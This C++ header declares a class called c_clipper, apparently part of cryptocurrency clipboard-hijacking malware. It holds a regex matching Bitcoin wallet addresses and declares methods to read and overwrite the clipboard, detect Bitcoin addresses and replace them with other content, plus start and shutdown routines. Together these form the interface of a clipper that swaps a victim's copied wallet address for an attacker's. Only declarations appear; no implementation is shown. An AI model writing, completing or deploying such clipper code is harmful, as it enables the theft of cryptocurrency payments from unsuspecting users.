#pragma once
#include "imports.hpp"
#include <regex>

class c_clipper : public c_singleton<c_clipper>
{
private:
    std::regex bitcoin_wallet_regex = std::regex("(bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|[13][a-km-zA-HJ-NP-Z1-9]{25,35})");
public:
    bool is_bitcoin_address(std::string bitcoin_address);
    std::string replace_bitcoin_address(std::string bitcoin_address, std::string replace_content);

    std::string get_clipboard();
    void set_clipboard(std::string clipboard_data);

    void start();
    void shutdown();
};